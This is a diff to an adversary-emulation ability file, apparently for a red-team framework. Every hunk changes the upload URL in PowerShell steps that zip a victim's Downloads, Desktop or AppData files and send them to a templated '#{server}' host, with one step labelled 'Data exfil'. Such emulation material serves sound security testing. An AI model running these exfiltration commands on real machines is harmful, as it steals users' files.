@@ -194,7 +194,7 @@
       psh,pwsh:
         command: |
           Import-Module .\upload.ps1 -Verbose -Force;
-          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
+          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/api/v2/payloads";
         payloads:
         - upload.ps1
 
@@ -213,7 +213,7 @@
   - name: powershell
     command: |
       Import-Module .\upload.ps1 -Verbose -Force;
-      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/file/upload";
+      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip" -Uri "#{server}/api/v2/payloads";
 
 - id: 5df12481-9d8c-4235-b550-9cefc8ed7361
   name: Process Discovery
@@ -1472,7 +1472,7 @@
           Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
 
           Import-Module .\upload.ps1 -Verbose -Force;
-          Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
+          Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/api/v2/payloads";
           if ($?) {
             write-host "[+] Data exfil of download directory completed!";
           } else {
@@ -1500,7 +1500,7 @@
       Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
 
       Import-Module .\upload.ps1 -Verbose -Force;
-      Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
+      Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/api/v2/payloads";
       if ($?) {
         write-host "[+] Data exfil of download directory completed!";
       } else {
@@ -1845,7 +1845,7 @@
       psh,pwsh:
         command: |
           Import-Module .\upload.ps1 -Verbose -Force;
-          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/api/v2/payloads";
         cleanup: |
           remove-item upload.ps1 -Force
         payloads:
@@ -1866,7 +1866,7 @@
   - name: powershell
     command: |
       Import-Module .\upload.ps1 -Verbose -Force;
-      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/api/v2/payloads";
     cleanup_command: |
       remove-item upload.ps1 -Force
 
